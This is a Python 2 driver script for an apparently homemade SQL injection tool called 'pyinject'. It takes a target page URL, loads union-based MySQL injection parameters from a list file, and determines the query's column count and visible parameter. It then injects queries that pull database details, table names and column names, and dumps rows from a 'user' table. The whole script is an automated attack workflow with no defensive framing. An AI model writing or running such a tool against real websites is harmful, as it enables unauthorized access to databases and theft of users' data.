#!/usr/bin/python
""" Driver program for pyinject. Handles user-defined options and calls appropriate modules.

    OPTIONS to support:
        -f:     \n-delimited text file of parameters to inject (default is mysql_params).
        -d:     Delimiter to use. Default is '/**/', also can use:
                                             '%20' 
        -db:    Database to try injections against (default is MySQL). Only MySQL supported as of now.
        -v:     Verbose mode.
"""

import os, sys, urllib2
import builder, datastore, injector, scanner, parser, reporter
import pprint
import json

if __name__ == '__main__':

    if len(sys.argv) == 1:
        print 'Help?'
        sys.exit(0)

    page = sys.argv[1]

    # whitespace-delimited file
    mysql_params = open('./lists/mysql/basic_union.txt').read().split()

    # Instantiate classes used
    build = builder.Builder(page, mysql_params)
    store = datastore.Store()
    fang = injector.Injector(page, "")
    report = reporter.Reporter()
    parse = parser.Parser(store)

    # Get column data for union statement
    print '\n### Basic Page Structure ###'
    num_columns = fang.get_num_columns() 
    report.columns_in_statement(num_columns)
    magic_num = int(fang.get_visible_param())
    print '\tMagic Param','\t', magic_num

    # Get DB params
    print '\n### Basic DB Info ###'
    data = fang.injection(build.union(num_columns, magic_num)) 
    report.db_info(parse.params(data))

    # Get tables
    print '### Interesting Tables ###'
    data = fang.injection(build.tables(num_columns, magic_num)) 
    report.tables(parse.tables(data))

    # Get columns
    print '\n### DB Table Columns ###'
    data = fang.injection(build.columns(num_columns, magic_num)) 
    report.columns(parse.columns(data))

    # Get rows
    data = parse.columns(data)
    x = build.rows(num_columns, magic_num, 'user', data)
    data = fang.injection(x)
    print data
    #print parse.rows(data)
    #report.XXX(parse.XXX(data))
        


